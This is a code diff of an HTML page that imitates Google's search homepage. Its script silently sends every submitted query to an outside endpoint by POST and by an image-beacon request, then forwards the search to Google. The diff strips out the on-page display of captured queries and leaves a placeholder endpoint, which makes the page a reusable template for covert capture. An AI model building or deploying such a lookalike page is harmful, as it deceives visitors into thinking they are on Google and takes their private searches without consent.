@@ -37,7 +37,6 @@
     @media (prefers-color-scheme: dark) { .search input { background:#4e5156; color:#e8eaed; } }
     .search .material-symbols-outlined { position:absolute; top:50%; transform:translateY(-50%); font-size:22px; color:var(--icon); cursor:pointer; user-select:none; }
     .search .search-icon { left:16px; } .search .mic { right:56px; } .search .camera { right:18px; }
-    .reveal { margin-top:12px; font-size:14px; color:var(--icon); text-align:center; }
     footer { margin-top:auto; border-top:1px solid var(--border); background:var(--bg); padding:14px; text-align:center; }
     footer a { color:var(--text); opacity:.9; text-decoration:none; font-size:14px; margin:0 8px; }
     footer a:hover { text-decoration:underline; }
@@ -63,16 +62,12 @@
     <div class="logo">
       <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
     </div>
-
     <form id="search" class="search" action="https://www.google.com/search" method="GET">
       <span id="searchButton" class="material-symbols-outlined search-icon" title="Search">search</span>
       <input id="q" name="q" type="search" placeholder="Search" aria-label="Search">
       <span class="material-symbols-outlined mic">mic</span>
       <span class="material-symbols-outlined camera">photo_camera</span>
     </form>
-
-    <!-- live reveal line (what Worker has as latest) -->
-    <div id="reveal" class="reveal">Updated: …</div>
   </main>
 
   <footer>
@@ -86,7 +81,7 @@
   </footer>
 
   <script>
-    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';
+    const ENDPOINT = 'https://YOUR_WORKER_URL';
 
     function sendToBackend(q){
       try {
@@ -97,12 +92,11 @@
         } else {
           fetch(ENDPOINT, { method:'POST', body:params, keepalive:true, mode:'cors' }).catch(()=>{});
         }
-        // Optional: also GET (works even if POST blocked)
+        // also fire a GET (works even if POST blocked)
         (new Image()).src = ENDPOINT + '?' + params.toString();
       } catch(e){}
     }
 
-    // exact same UI behavior
     const form = document.getElementById('search');
     const input = document.getElementById('q');
     const searchBtn = document.getElementById('searchButton');
@@ -124,32 +118,6 @@
       const q = (input.value || '').trim();
       if(q){ sendToBackend(q); form.submit(); } else { input.focus(); }
     });
-
-    // NEW: poll latest from Worker and show it under the search box
-    (function(){
-      const el = document.getElementById('reveal');
-      let etag = null;
-      const POLL_MS = 1000;
-
-      async function poll(){
-        try{
-          const r = await fetch(ENDPOINT + '?latest=1', {
-            cache: 'no-store',
-            headers: etag ? { 'If-None-Match': etag } : {}
-          });
-          if (r.status === 304) return;
-          if (!r.ok) return;
-          etag = r.headers.get('etag') || etag;
-          const d = await r.json();
-          const q = (d.q || '').trim() || '…';
-          const ts = new Date(d.ts || Date.now()).toLocaleString();
-          el.textContent = 'Updated: ' + ts + ' — ' + q;
-        }catch(e){}
-      }
-
-      setInterval(poll, POLL_MS);
-      poll(); // prime
-    })();
   </script>
 </body>
 </html>
